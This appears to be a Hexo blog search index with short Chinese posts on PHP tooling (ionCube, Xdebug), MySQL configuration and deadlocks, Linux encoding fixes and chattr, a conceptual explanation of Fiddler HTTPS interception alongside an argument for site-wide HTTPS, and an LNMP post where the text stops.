<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ionCube Php 解密</title>
    <url>/2016/06/ioncube-crypto-php/</url>
    <content><![CDATA[<h2 id="工具说明"><a href="#工具说明" class="headerlink" title="工具说明"></a>工具说明</h2><p>ionCube 是一款 Php 加密的工具。由于 Php 代码属于开源 WEB 代码，不同用户很容易看到使用 Php 语言所篇写的源程序，对源程序进行分析，很容易的得到数据连接，处理流程，甚至服务器名等。因此为了我们的 Web 数据等信息的安全。我们就必须对 Php 进行加密。</p>
<span id="more"></span>

<p>本文讲解的是在 windows 平台下如何安装 <code>ioncube php</code> 加密工具及配置方法。感兴趣的同学参考下.</p>
<p>ioncube 与 xcache 类似的，ioncube 是为数不多能够在 windows+apache 环境使用的 Php 优化工具之一。其作用与大名鼎鼎的 Zend Optimizer 大抵相似，但是如之前 WAMP 安装后对 Php 提速优化一文中介绍到的，Zend Optimizer 只支持到 php5.2.x，而新的 Zend Guard Loader 虽然支持 php5.3.x，但是只能在 windows+IIS 中使用。</p>
<p>安装方法如下:</p>
<ol>
<li><p>下载 ioncube_loaders_win_vc9_x86.zip <span class="exturl" data-url="aHR0cDovL3d3dy5pb25jdWJlLmNvbS8=">官网<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p>将压缩包内的 ioncube_loader_win_5.3.dll 拷贝至 wamp\bin\php\php5.3.8\zend_ext 目录下</p>
</li>
<li><p>在 wamp\bin\apache\Apache2.2.21\bin\php.ini 中添加<br>zend_extension &#x3D; “d:&#x2F;dev&#x2F;wamp&#x2F;bin&#x2F;php&#x2F;php5.3.8&#x2F;zend_ext&#x2F;ioncube_loader_win_5.3.dll”<br>注意：如果使用 Xdebug 的话，ioncube_loader.dll 的 zend_extension 声明要放在 Xdebug 的 zend_extension 之前</p>
</li>
<li><p>web server</p>
</li>
<li><p>将压缩包内的 loader-wizard.php 拷贝至 wamp\www 目录下</p>
</li>
</ol>
<p>在浏览器中键入 <code>http://yourdomain/loader-wizard.php</code>, cache 会自动安装，安装完成后给出成功信息。</p>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
      <tags>
        <tag>ionCube</tag>
      </tags>
  </entry>
  <entry>
    <title>ECShop 电商系统对接阿里云 RDS 数据库</title>
    <url>/2016/06/ecshop-aliyun-mysql/</url>
    <content><![CDATA[<h2 id="配置阿里云-RDS-数据库"><a href="#配置阿里云-RDS-数据库" class="headerlink" title="配置阿里云 RDS 数据库"></a>配置阿里云 RDS 数据库</h2><p>（一），找到阿里云的 RDS，数据安全性里面的白名单设置里面添加白名单 IP 地址</p>
<p>（二），更改系统或者项目下的数据库配置文件，链接地址，端口号，数据库，数据库名字，数据库密码</p>
<span id="more"></span>

<p>（三），停止当前环境的 MySQL 数据库</p>
<p>最后就可以进行测试，访问啦，可以用 SHOW PROCESSLIST； </p>
<p>来查看当前访问的链接信息！</p>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>ECShop</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux centos 服务器乱码问题</title>
    <url>/2016/06/linux-centos-charset/</url>
    <content><![CDATA[<h2 id="7z-方案"><a href="#7z-方案" class="headerlink" title="7z 方案"></a>7z 方案</h2><p>需要安装 p7zip 和 convmv，在 Centos 下的命令是</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>su -c <span class="string">&#x27;yum install p7zip convmv&#x27;</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>在 ubuntu 下的安装命令是</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">$ sudo apt-<span class="built_in">get</span> install p7zip convmv</span><br></pre></td></tr></table></figure>

<p>安装完之后，就可以用 7za 和 convmv 两个命令完成解压缩任务。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> LANG=C <span class="number">7</span>za x your<span class="literal">-zip-file</span>.zip</span><br><span class="line"><span class="variable">$</span> convmv <span class="operator">-f</span> GBK <span class="literal">-t</span> utf8 <span class="literal">--notest</span> <span class="literal">-r</span> .</span><br><span class="line"><span class="variable">$</span> convmv <span class="operator">-f</span> gb2312 <span class="literal">-t</span> utf8 <span class="literal">-r</span> <span class="literal">--notest</span> *</span><br></pre></td></tr></table></figure>

<ol>
<li>第一条命令用于解压缩，而 LANG&#x3D;C 表示以 US-ASCII 这样的编码输出文件名，如果没有这个语言设置，它同样会输出乱码，只不过是 UTF8 格式的乱码 (convmv 会忽略这样的乱码)。</li>
<li>第二条命令是将 GBK 编码的文件名转化为 UTF8 编码，-r 表示递归访问目录，即对当前目录中所有文件进行转换。<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">$ echo <span class="variable">$LANG</span></span><br><span class="line">$ locale</span><br><span class="line">$ <span class="built_in">export</span> <span class="attribute">LC_ALL</span>=zh_CN.UTF-8</span><br><span class="line">$ <span class="built_in">export</span> <span class="attribute">LANG</span>=zh_CN.UTF-8</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="以下为-python-解决办法"><a href="#以下为-python-解决办法" class="headerlink" title="以下为 python 解决办法"></a>以下为 python 解决办法</h2><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line">print &quot;Processing File &quot; + sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">file=zipfile.ZipFile(sys.argv[<span class="number">1</span>],&quot;r&quot;);</span><br><span class="line"><span class="keyword">for</span> <span class="type">name</span> <span class="keyword">in</span> file.namelist():</span><br><span class="line">    utf8name=<span class="type">name</span>.decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">    print &quot;Extracting &quot; + utf8name</span><br><span class="line">    pathname = os.path.dirname(utf8name)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.<span class="keyword">exists</span>(pathname) <span class="keyword">and</span> pathname!= &quot;&quot;:</span><br><span class="line">        os.makedirs(pathname)</span><br><span class="line">    data = file.<span class="keyword">read</span>(<span class="type">name</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.<span class="keyword">exists</span>(utf8name):</span><br><span class="line">        fo = <span class="keyword">open</span>(utf8name, &quot;w&quot;)</span><br><span class="line">        fo.<span class="keyword">write</span>(data)</span><br><span class="line">        fo.<span class="keyword">close</span></span><br><span class="line">file.<span class="keyword">close</span>()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Centos</tag>
        <tag>Charset</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 的 chattr 与 lsattr 命令详解</title>
    <url>/2016/06/linux-chattr-lsattr/</url>
    <content><![CDATA[<h2 id="命令说明"><a href="#命令说明" class="headerlink" title="命令说明"></a>命令说明</h2><p>PS：有时候你发现用 root 权限都不能修改某个文件，大部分原因是曾经用 chattr 命令锁定该文件了。chattr 命令的作用很大，其中一些功能是由 Linux 内核版本来支持的，不过现在生产绝大部分跑的 linux 系统都是 2.6 以上内核了。通过 chattr 命令修改属性能够提高系统的安全性，但是它并不适合所有的目录。chattr 命令不能保护 &#x2F;、&#x2F;dev、&#x2F;tmp、&#x2F;var 目录。lsattr 命令是显示 chattr 命令设置的文件属性。</p>
<span id="more"></span>

<p>这两个命令是用来查看和改变文件、目录属性的，与 chmod 这个命令相比，chmod 只是改变文件的读写、执行权限，更底层的属性控制是由 chattr 来改变的。</p>
<p>chattr 命令的用法：chattr [-RVf] [ -v version ] [ mode ] files…<br>最关键的是在 [mode] 部分，[mode] 部分是由 +-&#x3D; 和 [ASacDdIijsTtu] 这些字符组合的，这部分是用来控制文件的<br>属性。</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">+ ：在原有参数设定基础上，追加参数。</span><br><span class="line"><span class="bullet">- </span>：在原有参数设定基础上，移除参数。</span><br><span class="line"><span class="section">= ：更新为指定参数设定。</span></span><br><span class="line">A：文件或目录的 atime (access time)不可被修改(modified), 可以有效预防例如手提电脑磁盘I/O错误的发生。</span><br><span class="line">S：硬盘I/O同步选项，功能类似sync。</span><br><span class="line">a：即append，设定该参数后，只能向文件中添加数据，而不能删除，多用于服务器日志文件安全，只有root才能设定这个属性。</span><br><span class="line">c：即compresse，设定文件是否经压缩后再存储。读取时需要经过自动解压操作。</span><br><span class="line">d：即no dump，设定文件不能成为dump程序的备份目标。</span><br><span class="line">i：设定文件不能被删除、改名、设定链接关系，同时不能写入或新增内容。i参数对于文件 系统的安全设置有很大帮助。</span><br><span class="line">j：即journal，设定此参数使得当通过mount参数：data=ordered 或者 data=writeback 挂 载的文件系统，文件在写入时会先被记录(在journal中)。如果filesystem被设定参数为 data=journal，则该参数自动失效。</span><br><span class="line">s：保密性地删除文件或目录，即硬盘空间被全部收回。</span><br><span class="line">u：与s相反，当设定为u时，数据内容其实还存在磁盘中，可以用于undeletion。</span><br><span class="line">各参数选项中常用到的是a和i。a选项强制只可添加不可删除，多用于日志系统的安全设定。而i是更为严格的安全设定，只有superuser (root) 或具有CAP_LINUX_IMMUTABLE处理能力（标识）的进程能够施加该选项。</span><br></pre></td></tr></table></figure>

<h2 id="应用举例"><a href="#应用举例" class="headerlink" title="应用举例"></a>应用举例</h2><ol>
<li><p>用 chattr 命令防止系统中某个关键文件被修改</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">chattr +i /etc/resolv.conf</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>然后用 mv &#x2F;etc&#x2F;resolv.conf 等命令操作于该文件，都是得到 Operation not permitted 的结果。vim 编辑该文件时会提示 W10: Warning: Changing a readonly file 错误。要想修改此文件就要把 i 属性去掉</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">chattr -i /etc/resolv.conf</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>执行 <code>$ lsattr /etc/resolv.conf</code> 命令会显示如下属性</p>
<figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="literal">----</span><span class="comment">i</span><span class="literal">--------</span> <span class="comment">/etc/resolv</span><span class="string">.</span><span class="comment">conf</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>让某个文件只能往里面追加数据，但不能删除，适用于各种日志文件</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">$ chattr +a /<span class="keyword">var</span>/<span class="built_in">log</span>/messages</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>chattr</tag>
        <tag>lsattr</tag>
      </tags>
  </entry>
  <entry>
    <title>PhpStorm 调试详解（包含命令行以及浏览器）</title>
    <url>/2016/06/phpstorm-debug-detail/</url>
    <content><![CDATA[<h2 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h2><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">Php 版本：<span class="number">5.5</span>.<span class="number">12</span></span><br><span class="line">PhpStorm : 9.0.2 </span><br><span class="line">Xdebug : 2.2.5    下载地址，请下载与当前 <span class="type">PHP</span> 版本对应的版本</span><br><span class="line">系统平台：Windows <span class="number">7</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="一-要先给-Php-安装-Xdebug-扩展"><a href="#一-要先给-Php-安装-Xdebug-扩展" class="headerlink" title="一. 要先给 Php 安装 Xdebug 扩展"></a>一. 要先给 Php 安装 Xdebug 扩展</h2><ol>
<li><p>下载 xdebug，将下载完后的文件放在 PHP 安装路径下的 ext 目录下，PHP5.5 的安装包中默认有 zend_ext 的目录，放在该目录下也可。</p>
<p> 稍后记住安装的路径（D:\root\wamp\bin\php\php5.5.12\ext\php_xdebug-2.2.5-5.5-vc11.dll 或 D:\wamp\bin\php\php5.5.12\zend_ext\php_xdebug-2.2.5-5.5-vc11.dll）</p>
</li>
<li><p>修改 php.ini, 关联 xdebug 是 xdebug 生效</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment">;XDEBUG Extension</span></span><br><span class="line"><span class="attr">zend_extension</span> = <span class="string">&quot;D:/wamp/bin/php/php5.5.12/zend_ext/php_xdebug-2.2.5-5.5-vc11.dll&quot;</span></span><br><span class="line"><span class="comment">;将xdebug的扩展路径添加到这里(步骤一中的路径，根据你的xdebug放置的路径来确定。)</span></span><br><span class="line"><span class="section">[xdebug]</span></span><br><span class="line"><span class="attr">xdebug.remote_enable</span> = <span class="literal">on</span>  <span class="comment">#开启xdebug的调试</span></span><br><span class="line"><span class="attr">xdebug.remote_port</span> = <span class="number">9001</span>  <span class="comment">#xdebug调试侦听的端口</span></span><br><span class="line"><span class="attr">xdebug.remote_host</span> = localhost <span class="comment">#本地的侦听的主机</span></span><br><span class="line"><span class="attr">xdebug.idekey</span> = phpstorm  <span class="comment">#用IDE协助时需要的key</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>通过访问 phpinfo, 查看是否配置正确</p>
</li>
</ol>
<h2 id="二-PhpStorm-的相关配置"><a href="#二-PhpStorm-的相关配置" class="headerlink" title="二. PhpStorm 的相关配置"></a>二. PhpStorm 的相关配置</h2><ol>
<li><p>基本 debug 设定，点击菜单栏 File-&gt;Settings, 打开对话框，左侧的下拉菜单 Languages &amp; Frameworks -&gt; PHP -&gt; Debug 设定</p>
<p> 主要是配置 Debug port ：9001 ，选用 9001, 防止 9000 端口被占用。</p>
</li>
<li><p>打开 Debug-&gt;DBGp proxy, 在这里补充在 php.ini 的配置项。</p>
</li>
<li><p>新建一个 php 的 servers,name 修改为 test，Host：localhost，port：80，Debugger：Xdebug，保存。</p>
<p> 这个 server 是留到后来配置具体的 debug 是要用的。</p>
</li>
<li><p>针对项目的 Debug 设定，点击菜单栏的 Run-&gt;Edit configurations..，打开对话框</p>
<p> 添加新的 debug 配置，当前针对 php 的项目选择新的 server,（步骤 3 中配置过的 server 即可）</p>
<p> 新的 debug 可以命名为 name:debugphp，</p>
<p> server: 选择我们刚刚配置的 server</p>
<p> start Url ： 默认就是什么目录下，当然你可以随意添加</p>
<p> Browser : 选择你认为合适的浏览器即可了</p>
</li>
</ol>
<h2 id="三-开始调试"><a href="#三-开始调试" class="headerlink" title="三. 开始调试"></a>三. 开始调试</h2><ol>
<li>添加断点，打开一个在 root 目录下的 PHP 文件，选择 php 文件中的任意一行右键添加断点，或者在该行头部点击。</li>
<li>shift+F9 或者点击菜单栏右边的蜘蛛</li>
<li>PhpStorm 会打开浏览器，并且执行程序，捕捉到调试点。回到 debug 界面了</li>
</ol>
<p>以上就完成了对浏览器的调试支持。</p>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
      <tags>
        <tag>PhpStorm</tag>
        <tag>Xdebug</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL 出现死锁情况</title>
    <url>/2016/07/ecshop-mysql-lock/</url>
    <content><![CDATA[<h2 id="MySQL-死锁问题解决"><a href="#MySQL-死锁问题解决" class="headerlink" title="MySQL 死锁问题解决"></a>MySQL 死锁问题解决</h2><p>这个问题烦心一星期啦，也真是操蛋！ 问题描述 ECShop 连接本地 MySQL 数据库刚刚的，链接阿里云就出现错误！ </p>
<p>一， 出现 500 错误是因为阿里云没有添加白名单</p>
<span id="more"></span>

<p>二， 出现 504 错误是因为 MySQL 上锁的问题， <span class="exturl" data-url="aHR0cDovL2Jsb2cuY3Nkbi5uZXQvemhhbmdob25nemhlbmczMjEzL2FydGljbGUvZGV0YWlscy81MTc1MzE4OQ==">具体详解见<i class="fa fa-external-link-alt"></i></span></p>
<p>阿里云和本地具体区别，阿里云是 innodb 数据库引擎，事务隔离是 Read committed，而本地数据库引擎默认是是 myisam 引擎，事务隔离级别是 Repeatable read。</p>
<p>本地和阿里云 MySQL 具体参数配置不同的地方太多，导致程序运行到一个点时出现 MySQL 死锁的情况，具体可以用 show engine innodb status 来查看当前死锁的线程，可以用 kill ID 来删除线程！</p>
<p>后来仔细看聊文档，死活找不见问题，最后使出绝招更换数据库，把 MySQL5.6 更换成 5.5，问题彻底解决，再也找不见 MySQL 上锁的问题啦！</p>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>ECShop</tag>
      </tags>
  </entry>
  <entry>
    <title>Http 劫持</title>
    <url>/2016/07/http-https-fiddler/</url>
    <content><![CDATA[<h2 id="使用-Fiddler-对数据进行拦截"><a href="#使用-Fiddler-对数据进行拦截" class="headerlink" title="使用 Fiddler 对数据进行拦截"></a>使用 Fiddler 对数据进行拦截</h2><p>首先 Fiddler 截获客户端浏览器发送给服务器的 https 请求， 此时还未建立握手。</p>
<p>第一步， Fiddler 向服务器发送请求进行握手， 获取到服务器的 CA 证书， 用根证书公钥进行解密， 验证服务器数据签名， 获取到服务器 CA 证书公钥。</p>
<span id="more"></span>

<p>第二步， Fiddler 伪造自己的 CA 证书， 冒充服务器证书传递给客户端浏览器， 客户端浏览器做跟 Fiddler 一样的事。</p>
<p>第三步， 客户端浏览器生成 https 通信用的对称密钥， 用 Fiddler 伪造的证书公钥加密后传递给服务器， 被 Fiddler 截获。</p>
<p>第四步， Fiddler 将截获的密文用自己伪造证书的私钥解开， 获得 https 通信用的对称密钥。</p>
<p>第五步， Fiddler 将对称密钥用服务器证书公钥加密传递给服务器， 服务器用私钥解开后建立信任， 握手完成， 用对称密钥加密消息， 开始通信。</p>
<p>第六步， Fiddler 接收到服务器发送的密文， 用对称密钥解开， 获得服务器发送的明文。再次加密， 发送给客户端浏览器。</p>
<p>第七步， 客户端向服务器发送消息， 用对称密钥加密， 被 fidller 截获后， 解密获得明文。</p>
<p>由于 Fiddler 一直拥有通信用对称密钥， 所以在整个 https 通信过程中信息对其透明。</p>
<h2 id="HTTPS-能否避免流量劫持？"><a href="#HTTPS-能否避免流量劫持？" class="headerlink" title="HTTPS 能否避免流量劫持？"></a>HTTPS 能否避免流量劫持？</h2><p>近日，看了一篇关于流量劫持的文章《安全科普：流量劫持能有多大危害？》，作者 EtherDream 以图文并茂的形式详细讲解了流量劫持及相关知识。“在如今这个讲究跨平台、体验好，并有云端支持的年代，WebApp 越来越火热。各种应用纷纷移植成网页版，一些甚至替代了客户端。同时，也造就了流量劫持前所未有的势头。” 小编总结，这里提到的流量劫持危害，大多跟 Http 明文传输协议的薄弱有关系。</p>
<p>我们来看看流量劫持会带来什么危害？</p>
<p>不同的劫持方式，获得的流量也有所差异。DNS 劫持，只能截获通过域名发起的流量，直接使用 IP 地址的通信则不受影响；CDN 入侵，只有浏览网页或下载时才有风险，其他场合则毫无问题；而网关被劫持，用户所有流量都难逃魔掌。</p>
<p>1、http 易致在线应用被劫持</p>
<p>网页技术在近些年里有了很大的发展，但其底层协议始终没有太大的改进 —— HTTP，一种使用了 20 多年古老协议。在 HTTP 里，一切都是明文传输的，流量在途中可随心所欲的被控制。而在线使用的 WebApp，流量里既有通信数据，又有程序的界面和代码，劫持简直轻而易举。因此，劫持网页流量成了各路黑客们的钟爱，一种可在任意网页发起 XSS 的入侵方式。</p>
<p>2、公共场合使用 http，不登陆也会被劫持</p>
<p>在自己的设备上，大家都会记住各种账号的登录状态，反正只有自己用，也没什么大不了的。然而，在被劫持的网络里，即使浏览再平常不过的网页，或许一个悄无声息的间谍脚本已暗藏其中，正偷偷访问你那登录着的网页，操控起你的账号了。</p>
<p>3、http 状态下，Cookie 记录或浏览器自动填表单，都会导致账号密码被截获</p>
<p>http 状态下，cookie 记录的都是明文的账号密码，被劫持泄露后，即使数量不多，也能通过社工获取到用户的更多信息，最终导致更严重的泄露。</p>
<p>4、HTTP 缓存投毒</p>
<p>HTTP 这种简单的纯文本协议，几乎没有一种签名机制，来验证内容的真实性。即使页面被篡改了，浏览器也完全无法得知，甚至连同注入的脚本也一块缓存起来。但凡具备可执行的资源，都可以通过预加载带毒的版本，将其提前缓存起来。</p>
<p>5、Https 能避免劫持吗？</p>
<p>能！但前提是必须用受信任的 SSL 证书。</p>
<p>不同于简单的 Http 代理，HTTPS 服务需要权威 CA 机构颁发的 SSL 证书才算有效。自签证书浏览器不认，而且会给予严重的警告提示。而遇到 “此网站安全证书存在问题” 的警告时，大多用户不明白是什么情况，就点了继续，导致允许了黑客的伪证书，HTTPS 流量因此遭到劫持。</p>
<p>如果重要的账户网站遇到这种情况，无论如何都不该点击继续，否则大门钥匙或许就落入黑客之手。</p>
<p>这里所说的权威 CA 机构是指已经通过 WebTrust 国际认证，根证书由微软预置，受微软等各类操作系统、主流移动设备和浏览器信任的 CA 机构；在中国还要附加一项，就是要拿到工信部许可的 CA 牌照；这样的 CA 机构，才有权利签发各类数字证书，比如 wosign（沃通）。</p>
<p>自签证书是指不受信任的任意机构或个人，自己随意签发的证书，容易被黑客伪造替换。</p>
<p>6、全站 Https 的重要性</p>
<p>情况一：从 http 页面跳转访问 https 页面</p>
<p>事实上，在 PC 端上网很少有直接进入 HTTPS 网站的。例如支付宝网站，大多是从淘宝跳转过来，而淘宝使用的仍是不安全的 HTTP 协议。如果在淘宝网的页面里注入 XSS，屏蔽跳转到 HTTPS 的页面访问，用 HTTP 取而代之，那么用户也就永远无法进入安全站点了。</p>
<p>尽管地址栏里没有出现 HTTPS 的字样，但域名看起来也是正确的，大多用户都会认为不是钓鱼网站，因此也就忽视了。</p>
<p>因此，只要入口页是不安全的，那么之后的页面再安全也无济于事。</p>
<p>情况二：http 页面重定向到 https 页面</p>
<p>有一些用户通过输网址访问的，他们输入了 <span class="exturl" data-url="aHR0cDovL3d3dy5hbGlwYWx5LmNvbS8=">http://www.alipaly.com<i class="fa fa-external-link-alt"></i></span> 就敲回车进入了。然而，浏览器并不知道这是一个 HTTPS 的站点，于是使用默认的 HTTP 去访问。不过这个 HTTP 版的支付宝的确也存在，其唯一功能就是重定向到自己 HTTPS 站点上。</p>
<p>劫持流量的中间人一旦发现有重定向到 HTTPS 站点的，于是拦下重定向的命令，自己去获取重定向后的站点内容，然后再回复给用户。于是，用户始终都是在 HTTP 站点上访问，自然就可以无限劫持了。</p>
<p>国外各大知名网站（PayPal,Twitter,Facebook,Gmail,Hotmail 等）都通过 Always on SSL（全站 https）技术措施来保证用户机密信息和交易安全，防止会话攻击和中间人攻击。</p>
<p>7、搜索引擎劫持</p>
<p>事实上，HTTPS 站点还有个很大的来源 —— 搜索引擎。遗憾的是，国产搜索引擎几乎都不提供 HTTPS 服务。</p>
<p>谷歌已开始提供 https 加密搜索方式。Google 在官方博客介绍说，普通的 HTTP 浏览是不安全的，用户和服务器之间的通讯会被第三方监听和干扰，对于 Google 来说，你在 Google 搜索的词语会被第三方截获，如果第三方不希望你在 Google 搜索这个词语，还可以通过技术手段阻止用户的搜索行为。使用 HTTPS 的 Google 搜索中，用户搜索的信息将无法被第三方获取，也不会出现数据泄漏的问题，搜索结果页面也不会被干扰或篡改。</p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>从上面的各类劫持案例中，我们可以看出，Https 是很有效的流量劫持防范措施，无论是网络服务提供商还是广大网民，为咱自己的帐户安全和权益，都要形成使用 https 访问网站的习惯和意识，重要的网站必定使用 HTTPS 协议，登陆时需格外留意！</p>
]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
        <tag>Fiddler</tag>
      </tags>
  </entry>
  <entry>
    <title>MYSQL 分组语句</title>
    <url>/2016/07/mysql-group/</url>
    <content><![CDATA[<h2 id="MYSQL-分组语句"><a href="#MYSQL-分组语句" class="headerlink" title="MYSQL 分组语句"></a>MYSQL 分组语句</h2><p>标准的分组 Mysql，取的分组所有数据</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id = id <span class="keyword">group</span> <span class="keyword">by</span> id <span class="keyword">order</span> <span class="keyword">by</span> id <span class="keyword">desc</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>当使用分组取数量时，先取的所有分组，然后取数量</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> count () <span class="keyword">from</span> (<span class="keyword">select</span> count() <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id = id <span class="keyword">group</span> <span class="keyword">by</span> id <span class="keyword">order</span> <span class="keyword">by</span> id <span class="keyword">desc</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>) <span class="keyword">as</span> g;</span><br></pre></td></tr></table></figure>

<p>当对分组组内内容排序时，先对数据排序，然后分组取的排序后的数据</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">order</span> <span class="keyword">by</span> id <span class="keyword">desc</span>) <span class="keyword">as</span> g <span class="keyword">where</span> id = id <span class="keyword">group</span> <span class="keyword">by</span> id <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>当对分组组内内容排序和分组排序使用，各自排序</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">order</span> <span class="keyword">by</span> id <span class="keyword">desc</span>) <span class="keyword">as</span> g <span class="keyword">where</span> id = id <span class="keyword">group</span> <span class="keyword">by</span> id <span class="keyword">order</span> <span class="keyword">by</span> id <span class="keyword">desc</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
  </entry>
  <entry>
    <title>Php 框架</title>
    <url>/2016/07/php-framework/</url>
    <content><![CDATA[<h2 id="个人对-Php-框架的见解"><a href="#个人对-Php-框架的见解" class="headerlink" title="个人对 Php 框架的见解"></a>个人对 Php 框架的见解</h2><p>本文章是对问题 <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzI3MzM0OTU5">如何评价源生Php和框架下Php的效率 ？<i class="fa fa-external-link-alt"></i></span> 的个人见解， 用框架和不用框架，完全两个概念！</p>
<p>框架就像一个运钞车，他相对来说是安全的，避免了大量重复的，危险的操作。</p>
<span id="more"></span>

<p>虽然减少部分性能，但用框架开发项目或者模块，效率快，能够轻松实现各种功能，非常适合创业公司和外包人员开发项目。</p>
<p>而不使用框架就需要一点点实现功能，开发项目，耗时耗力，做一些特殊模块和要求特别高的项目可以！</p>
<p>我总是纠结于学习哪个框架开发项目，结果我发现，有的企业招聘里面直接有一个要求就是懂 Php 框架，也就是说不管什么框架，什么语言都是为项目需求的，而需求直接和利益挂钩！ </p>
<p>我现在明白为啥 Php 语言和 Php 框架这么流行啦！</p>
<ol>
<li>第一开源免费，除了给程序员开工资和一些房租，虚拟主机的费用，几乎不用其他额外费用。</li>
<li>第二开发速度快节约程序员大部分时间精力，为公司节省相对多的资源。</li>
</ol>
<p>就像这句话说得，原生和框架，只能说使用场合不一样。源生 Php 输出 hello world 比用框架快几百倍，但框架不是用来写 hello word 的。</p>
<p>徒手打蚊子肯定比高射炮效率高几百上千倍。 但高射炮是用来打蚊子的吗？</p>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
  </entry>
  <entry>
    <title>Php 多语言</title>
    <url>/2016/07/php-i18n/</url>
    <content><![CDATA[<h2 id="Php-多语言"><a href="#Php-多语言" class="headerlink" title="Php 多语言"></a>Php 多语言</h2><p>本文章是对问题 <span class="exturl" data-url="aHR0cDovL2Jicy5jc2RuLm5ldC90b3BpY3MvMzkwODY3MDEz">多语言系统的数据库设计问题<i class="fa fa-external-link-alt"></i></span> 的个人见解，处理的思路简单粗暴。</p>
<p>鉴于网络上沸沸扬扬的数据库多语言包功能无非就是两种。</p>
<span id="more"></span>

<h2 id="数据库多语言的实现"><a href="#数据库多语言的实现" class="headerlink" title="数据库多语言的实现"></a>数据库多语言的实现</h2><p>一种就是加字段的做法，只要是涉及到中文的字段，新增对应的英文的字段，这样中文网站用中文的地段，英文网站用英文的字段！ </p>
<p>一种就是加记录的方法，新增相同的英文记录，并且标记为英文，调取时中文网站调用标记为中文的记录，英文网站调用英文的记录！</p>
<p>这是数据库多语言的实现，强烈推荐第一种，易于维护和开发，第二种会照成数据冗余，数据库的庞大，</p>
<h2 id="页面的多语言实现"><a href="#页面的多语言实现" class="headerlink" title="页面的多语言实现"></a>页面的多语言实现</h2><p>而后就是页面的多语言咯，一般网站和 Php 框架都有这个功能，网上有很多教程和框架对应的说明。</p>
<p>就是在页面右上角，点击简体中文，整个页面用的都是网站提前设置好的简体中文语言包，点击英文，整个页面用的都是网站提前设置好的英文语言包！</p>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
      <tags>
        <tag>I18n</tag>
      </tags>
  </entry>
  <entry>
    <title>Lnmp 运维味道</title>
    <url>/2016/07/php-lnmp/</url>
    <content><![CDATA[<h2 id="Lnmp-运维味道"><a href="#Lnmp-运维味道" class="headerlink" title="Lnmp 运维味道"></a>Lnmp 运维味道</h2><p>购买域名，备案（可选），域名绑定 DNS 地址，DNS 地址解析域名，指定 IP 地址，购买 VPS，获取 IP 地址，部署 WEB 网站到 VPS，这里用的 WEB 网站使用 LnmpWEB 环境！</p>
